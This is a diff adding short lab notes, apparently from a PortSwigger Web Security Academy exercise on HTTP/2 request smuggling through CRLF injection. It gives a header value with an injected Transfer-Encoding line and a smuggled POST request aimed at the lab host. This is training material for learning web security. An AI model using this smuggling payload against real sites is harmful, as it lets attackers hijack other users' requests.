@@ -1,0 +1,21 @@
+Lab: HTTP/2 request smuggling via CRLF injection
+Notes:
+    A Carriage Return Line Feed (CRLF) injection attack(HTTP response splitting attack) -> anipulates the carriage return and line feed special characters found within a web application's HTTP header.
+
+    Ref. : https://portswigger.net/research/http2
+
+Analysis:
+(1)
+Use Transfer-Encoding in New request header:
+    abc=ac[shift-enter]
+    Transfer-Encoding: chunked
+
+(2)
+Append the smuggled request to  original request->
+POST / HTTP/1.1
+Host: 0a5d001003b3e2b280d480b700ee0025.web-security-academy.net
+Cookie: session=GhnYh5M79GZqUp4ONY0AwChOt5IPaGe4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1000
+
+search=fvds
